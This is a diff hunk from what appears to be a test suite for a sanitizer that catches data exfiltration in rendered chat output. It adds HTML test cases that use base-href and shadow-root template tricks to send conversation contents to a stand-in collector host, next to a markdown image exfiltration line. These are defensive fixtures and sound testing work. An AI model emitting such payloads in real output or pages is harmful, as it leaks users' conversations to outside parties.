@@ -672,6 +672,14 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ),
         ("<a href='java script:alert(1)'>x</a>", []),
         (
+            (
+                "<div><template shadowrootmode='open'></div><base href='https://safe.test/'></template>"
+                "<base href='https://collector.test/?q={c}'><a href=''>send</a>"
+            ),
+            ["uncheckable_markup"],
+        ),
+        ("Parse an HTML <table> into rows.</p>", []),
+        (
             "<div><select><base href=''></select><base href='https://collector.test/'><img src='/{c}.png'></div>",
             ["uncheckable_markup"],
         ),
